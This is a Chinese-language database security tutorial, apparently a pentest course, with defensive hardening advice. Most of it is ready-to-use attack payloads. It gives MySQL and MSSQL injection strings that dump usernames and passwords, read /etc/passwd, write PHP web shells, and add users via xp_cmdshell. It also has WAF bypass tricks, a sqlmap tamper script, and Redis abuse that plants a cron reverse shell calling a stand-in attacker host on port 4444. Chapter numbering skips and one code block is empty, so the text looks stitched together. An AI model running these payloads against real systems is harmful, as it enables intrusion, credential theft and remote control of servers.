## 第一章：数据库安全概述

### 1.1 数据库安全风险

数据库是 Web 应用的核心数据存储，一旦被攻破将导致严重的数据泄露。常见的安全风险包括：

| 风险类型 | 说明 | 危害 |
|---------|------|------|
| **SQL 注入** | 输入拼接 SQL 语句 | 数据泄露、篡改、删除、提权 |
| **弱口令** | 密码强度不足或默认密码 | 直接登录数据库 |
| **权限过大** | 应用账号权限过高 | 越权操作、数据泄露 |
| **未授权访问** | 数据库暴露公网且无认证 | 数据完全泄露 |
| **配置不当** | 默认配置、调试模式开启 | 信息泄露、被利用 |
| **数据未加密** | 敏感数据明文存储 | 数据泄露后直接可读 |
| **备份泄露** | 数据库备份文件可下载 | 全量数据泄露 |
| **组件漏洞** | 数据库自身漏洞 | 远程代码执行、提权 |

### 1.2 常见数据库及默认端口

| 数据库 | 默认端口 | 备注 |
|--------|---------|------|
| **MySQL** | 3306 | 最常见，LAMP/WAMP 标配 |
| **MSSQL** | 1433 | 微软 SQL Server，Windows 平台 |
| **Oracle** | 1521 | 企业级数据库 |
| **PostgreSQL** | 5432 | 开源对象关系型数据库 |
| **MongoDB** | 27017 | NoSQL 文档数据库 |
| **Redis** | 6379 | 内存数据库/缓存 |
| **Memcached** | 11211 | 分布式内存对象缓存 |
| **Elasticsearch** | 9200/9300 | 搜索引擎/NoSQL |
| **Access** | 文件型 | 常见于老 ASP 站点，.mdb/.accdb |
| **SQLite** | 文件型 | 轻量级，.db/.sqlite 文件 |

### 1.3 数据库安全层次

```
应用层安全
   ↓
访问控制（认证、授权）
   ↓
网络层安全（防火墙、端口限制）
   ↓
操作系统层安全（文件权限、补丁）
   ↓
数据库自身安全（配置、审计、加密）
   ↓
数据层安全（加密、脱敏、备份）
```

## 第二章：SQL 注入深入

### 2.1 SQL 注入原理

SQL 注入是通过在用户输入中插入恶意 SQL 代码，欺骗服务器执行非预期 SQL 操作的攻击方式。

**根本原因**：代码与数据未分离，用户输入被当作 SQL 代码执行。

**注入条件**：
1. 用户输入可控
2. 输入内容被拼接到 SQL 语句中
3. SQL 语句被数据库执行

### 2.2 SQL 注入分类

#### 按注入点类型

| 类型 | 说明 | 示例 |
|------|------|------|
| **数字型** | 参数为数字，无引号包裹 | `?id=1 AND 1=1` |
| **字符型** | 参数被单/双引号包裹 | `?name=admin' AND '1'='1` |
| **搜索型** | LIKE 查询 | `?keyword=test' AND '1'='1` |

#### 按返回结果

| 类型 | 说明 | 利用方式 |
|------|------|---------|
| **联合查询注入** | 页面有回显 | UNION SELECT 拼接结果 |
| **报错注入** | 错误信息回显 | 利用函数报错带出数据 |
| **布尔盲注** | 页面只有真假两种状态 | 逐位猜解 |
| **时间盲注** | 无回显，通过延迟判断 | SLEEP/BENCHMARK 延时判断 |
| **堆叠注入** | 支持多语句执行 | `;` 分隔执行多条 SQL |

### 2.3 注入点位置

- GET 参数（URL 查询字符串）
- POST 参数（表单、JSON 数据）
- HTTP 头（User-Agent、Referer、Cookie、X-Forwarded-For 等）
- 文件上传（文件名）
- 路径参数（RESTful API）
- 排序/分页参数（ORDER BY 注入）
- 二次注入（先存数据库，取出时触发）

### 2.4 注入检测方法

```
1. 单引号测试：参数后加 '，观察是否报错
2. 布尔测试：AND 1=1 / AND 1=2，观察页面变化
3. 时间测试：AND SLEEP(5)，观察响应时间
4. 报错测试：用报错函数触发数据库错误
```

## 第三章：MySQL 注入利用

### 3.1 联合查询注入

**步骤**：

```sql
-- 1. 判断字段数（ORDER BY）
?id=1 ORDER BY 3 --      正常
?id=1 ORDER BY 4 --      报错 → 3 个字段

-- 2. 判断显示位（UNION SELECT）
?id=-1 UNION SELECT 1,2,3 --

-- 3. 获取基本信息
?id=-1 UNION SELECT
    version(),        -- 数据库版本
    database(),       -- 当前数据库名
    user()            -- 当前用户
--

-- 4. 获取所有数据库名
?id=-1 UNION SELECT
    1,
    group_concat(schema_name),
    3
FROM information_schema.schemata --

-- 5. 获取指定库的所有表名
?id=-1 UNION SELECT
    1,
    group_concat(table_name),
    3
FROM information_schema.tables
WHERE table_schema='数据库名' --

-- 6. 获取指定表的所有列名
?id=-1 UNION SELECT
    1,
    group_concat(column_name),
    3
FROM information_schema.columns
WHERE table_name='表名' AND table_schema='库名' --

-- 7. 脱库（获取数据）
?id=-1 UNION SELECT
    1,
    group_concat(username,0x3a,password),
    3
FROM 库名.表名 --
```

**MySQL 系统库 information_schema**：
- `SCHEMATA` — 所有数据库
- `TABLES` — 所有表
- `COLUMNS` — 所有列
- `USER_PRIVILEGES` — 用户权限

### 3.2 报错注入

当页面显示数据库错误信息时使用。

**常用报错函数**：

```sql
-- updatexml() — MySQL 5.1.5+
?id=1 AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --

-- extractvalue()
?id=1 AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e)) --

-- floor()+rand()+group by
?id=1 AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- exp() — MySQL 5.5.5+
?id=1 AND exp(~(SELECT * FROM (SELECT version())a)) --
```

### 3.3 布尔盲注

页面只有正常/不正常两种状态，无数据回显。通过构造布尔条件逐位猜解数据。

```sql
-- 判断数据库名长度
?id=1 AND length(database())>5 --

-- 猜数据库名第一个字符（ASCII 码）
?id=1 AND ascii(substr(database(),1,1))>97 --

-- 二分法猜解
?id=1 AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100 --

-- 常用函数
-- substr(str, pos, len) — 截取子串
-- ascii(str) — 获取 ASCII 码
-- ord(str) — 同上
-- mid(str, pos, len) — 同上
-- left(str, len) — 左截取
```

### 3.4 时间盲注

完全无回显时使用，通过响应时间判断。

```sql
-- SLEEP() — MySQL 5+
?id=1 AND SLEEP(5) --

-- 条件延时
?id=1 AND IF(ascii(substr(database(),1,1))=116,SLEEP(5),0) --

-- BENCHMARK() — 兼容性更好
?id=1 AND BENCHMARK(5000000,MD5(1)) --

-- 笛卡尔积延时
?id=1 AND (SELECT count(*) FROM information_schema.tables a, information_schema.tables b) --
```

### 3.5 常用 MySQL 注入函数

| 函数 | 用途 |
|------|------|
| `version()` | 数据库版本 |
| `database()` | 当前数据库名 |
| `user()` / `current_user()` | 当前用户 |
| `@@hostname` | 主机名 |
| `@@datadir` | 数据目录 |
| `@@basedir` | 安装目录 |
| `@@version_compile_os` | 操作系统 |
| `group_concat()` | 多行结果拼接成一行 |
| `concat_ws()` | 带分隔符拼接 |
| `hex()` / `unhex()` | 十六进制编解码 |
| `load_file()` | 读取文件（需 FILE 权限） |
| `into outfile` / `into dumpfile` | 写文件（需 FILE 权限） |

### 3.6 文件读写

```sql
-- 读文件（需要 FILE 权限，路径必须是完整路径）
?id=-1 UNION SELECT 1,load_file('/etc/passwd'),3 --
?id=-1 UNION SELECT 1,load_file('c:\\windows\\system32\\drivers\\etc\\hosts'),3 --

-- 写文件（需要 FILE 权限，secure_file_priv 需配置）
?id=-1 UNION SELECT 1,'<?php phpinfo();?>',3 INTO OUTFILE '/var/www/html/shell.php' --
?id=-1 UNION SELECT 1,'<?php eval($_POST[cmd]);?>',3 INTO DUMPFILE '/var/www/html/shell.php' --
```

### 3.7 绕过技巧

```sql
-- 空格绕过
?id=1/**/AND/**/1=1--
?id=1%09AND%091=1--
?id=1()AND()1=1--
?id=1/*!AND*/1=1--

-- 大小写绕过（有些 WAF 只过滤小写）
?id=1 UnIoN SeLeCt 1,2,3--

-- 双写绕过（WAF 只替换一次）
?id=1 UNIunionON SELselectECT 1,2,3--

-- 编码绕过
-- URL 编码、Unicode 编码、HTML 实体编码

-- 注释符
--    （双减号空格）
#     （井号）
/* */ （内联注释）
;%00  （空字节截断）
```

## 第四章：MSSQL 注入利用

### 4.1 联合查询注入

```sql
-- 判断字段数
?id=1 ORDER BY 3--

-- 联合查询
?id=-1 UNION SELECT 1,2,3--

-- 获取基本信息
?id=-1 UNION SELECT
    @@version,           -- 版本
    db_name(),           -- 当前库
    user                 -- 当前用户
--

-- 获取所有数据库
?id=-1 UNION SELECT
    1,
    name,
    3
FROM master..sysdatabases--

-- 获取表
?id=-1 UNION SELECT
    1,
    name,
    3
FROM 库名..sysobjects WHERE xtype='U'--

-- 获取列
?id=-1 UNION SELECT
    1,
    name,
    3
FROM 库名..syscolumns WHERE id=object_id('库名..表名')--
```

### 4.2 堆叠注入（MSSQL 支持多语句）

```sql
-- 执行多条 SQL
?id=1; INSERT INTO users(username,password) VALUES('hacker','123456')--

-- 开启 xp_cmdshell 执行命令（需 SA 权限）
?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
?id=1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
?id=1; EXEC master..xp_cmdshell 'whoami'--
?id=1; EXEC master..xp_cmdshell 'net user hacker P@ss123 /add'--
```

### 4.3 报错注入

```sql
-- convert() 报错
?id=1 AND 1=convert(int,(select top 1 name from master..sysdatabases))--

-- 整数溢出
?id=1 AND 1=(SELECT top 1 name FROM master..sysdatabases FOR XML PATH(''))--
```

### 4.4 时间盲注

```sql
-- WAITFOR DELAY
?id=1; WAITFOR DELAY '0:0:5'--

-- 条件延时
?id=1; IF (db_name()='master') WAITFOR DELAY '0:0:5'--
```

## 第六章：NoSQL 注入

### 6.1 MongoDB 注入

MongoDB 使用 JSON 格式查询，注入方式与传统 SQL 不同。

**PHP 示例**：
```php
// 不安全代码
$user = $_POST['username'];
$pass = $_POST['password'];
$query = array("username" => $user, "password" => $pass);
$cursor = $collection->findOne($query);
```

**注入利用**：
```
username[$ne]=1&password[$ne]=1
```
等价于查询 `username != 1 AND password != 1`，可能绕过登录。

**其他运算符**：
- `$gt` — 大于
- `$lt` — 小于
- `$ne` — 不等于
- `$regex` — 正则匹配
- `$where` — JavaScript 表达式（危险）

### 6.2 Redis 未授权访问

Redis 默认无密码认证，如果暴露公网可直接利用：

```bash
# 连接
redis-cli -h target_ip

# 写 Webshell（需知道 Web 目录）
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save

# 写 SSH 公钥
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n"
save

# 写计划任务反弹 shell
config set dir /var/spool/cron/
config set dbfilename root
set x "*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
save
```

## 第八章：数据库安全加固

### 8.1 访问控制

| 措施 | 说明 |
|------|------|
| **网络隔离** | 数据库不暴露公网，内网访问 |

| **禁止 root 远程** | 管理员账号只允许本地登录 |
| **删除默认账号** | 删除匿名账号、测试账号 |

| 措施 | 说明 |
|------|------|
| **参数化查询** | 使用 PreparedStatement，禁止拼接 SQL |
| **输入验证** | 白名单校验输入格式 |
| **输出编码** | 防止数据输出到前端时引发 XSS |
| **使用 ORM** | MyBatis/Hibernate 等框架 |
| **WAF** | Web 应用防火墙 |

### 8.3 数据安全

| 措施 | 说明 |
|------|------|

| **传输加密** | SSL/TLS 加密连接 |
| **数据脱敏** | 日志、备份中的敏感数据脱敏 |
| **备份安全** | 备份文件加密，限制访问权限 |
| **数据分级** | 根据敏感级别分类保护 |

### 8.4 审计与监控

| 措施 | 说明 |
|------|------|
| **开启审计日志** | 记录数据库操作日志 |
| **慢查询日志** | 发现异常查询 |
| **入侵检测** | 异常登录、异常操作告警 |
| **定期备份** | 全量+增量备份 |
| **漏洞扫描** | 定期扫描数据库漏洞 |
| **补丁更新** | 及时安装安全补丁 |

## 第九章：SQL 注入高级技术

### 9.1 二次注入

二次注入是指恶意数据先被存入数据库，在后续查询中被触发执行。

```sql
-- 步骤1：注册时存储恶意用户名
INSERT INTO users(username, password) VALUES('admin\'-- ', '123456');
-- 数据库存储：admin'-- （单引号被转义存储，但取出时不带转义）

-- 步骤2：修改密码时触发注入
UPDATE users SET password='newpass' WHERE username='admin'-- ';
-- 实际执行：UPDATE users SET password='newpass' WHERE username='admin'
-- 结果：直接修改了 admin 的密码
```

```php
// 不安全代码示例
// 注册时使用参数化查询（安全）
$stmt = $pdo->prepare("INSERT INTO users(username,password) VALUES(?,?)");
$stmt->execute([$username, $password]);

// 修改密码时拼接 SQL（不安全）
$sql = "UPDATE users SET password='$newpass' WHERE username='" . $_SESSION['username'] . "'";
// $_SESSION['username'] 是之前存储的 admin'--
// 实际拼接结果：UPDATE users SET password='xxx' WHERE username='admin'-- '
```

### 9.2 宽字节注入

宽字节注入利用 MySQL 的 `GBK` 编码特性，在单引号前注入特殊字节使其被"吃掉"。

```sql
-- 攻击载荷
?id=1%df' UNION SELECT 1,2,3-- 

-- 原理：
-- 1. PHP 使用 addslashes() 将 ' 转义为 \'
-- 2. 输入 %df' 经过转义变为 %df\'（即 %df%5c'）
-- 3. 在 GBK 编码中，%df%5c 组成一个汉字"運"
-- 4. 单引号 ' 逃逸出来
-- 5. 最终 SQL：...運' UNION SELECT 1,2,3-- 
```

**防御方法**：
```php
// 方法1：使用 mysql_set_charset 设置正确的字符集
mysqli_set_charset($conn, "utf8mb4");

// 方法2：使用参数化查询（PDO）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
```

### 10.5 自定义 Tamper 脚本

```python
#!/usr/bin/env python
# custom_tamper.py — 自定义 SQLMap Tamper 脚本

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    自定义 WAF 绕过脚本
    将空格替换为 %0b（垂直制表符）
    将 UNION SELECT 替换为 /*!UNION*/ /*!SELECT*/
    """
    if payload:
        # 替换空格
        payload = payload.replace(" ", "%0b")
        
        # 关键字注释绕过
        payload = payload.replace("UNION", "/*!UNION*/")
        payload = payload.replace("SELECT", "/*!SELECT*/")
        payload = payload.replace("AND", "/*!AND*/")
        
        # 大小写混合
        payload = payload.replace("union", "UnIoN")
        payload = payload.replace("select", "SeLeCt")
    
    return payload
```

```lua
-- MySQL Proxy Lua 脚本：SQL 注入防护
function read_query(packet)
    if packet:byte() ~= proxy.COM_QUERY then
        return
    end

    local query = packet:sub(2):lower()
    
    -- 检测 UNION SELECT 注入
    if query:match("union%s+select") then
        proxy.response.type = proxy.MYSQLD_PACKET_ERR
        proxy.response.errmsg = "Blocked: UNION SELECT detected"
        return proxy.PROXY_SEND_RESULT
    end
    
    -- 检测 information_schema 访问
    if query:match("information_schema") then
        proxy.response.type = proxy.MYSQLD_PACKET_ERR
        proxy.response.errmsg = "Blocked: System table access"
        return proxy.PROXY_SEND_RESULT
    end
    
    -- 检测危险函数
    if query:match("load_file") or 
       query:match("into%s+outfile") or
       query:match("xp_cmdshell") then
        proxy.response.type = proxy.MYSQLD_PACKET_ERR
        proxy.response.errmsg = "Blocked: Dangerous function"
        return proxy.PROXY_SEND_RESULT
    end
    
    -- 记录查询日志
    log_text = string.format("[%s] %s\n", os.date(), packet:sub(2))
    log_file:write(log_text)
end
```

```bash
#!/bin/bash
```

### 16.2 ORM 安全配置

```python
# Django ORM（默认安全）
# 正确：ORM 自动参数化
User.objects.filter(id=user_id, status='active')

# 危险：raw() 拼接
User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")  # 注入！

# 安全：raw() 参数化
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])

# 危险：extra() 拼接
User.objects.extra(where=f"id = {user_id}")  # 注入！

# 安全：extra() 参数化
User.objects.extra(where=["id = %s"], params=[user_id])
```
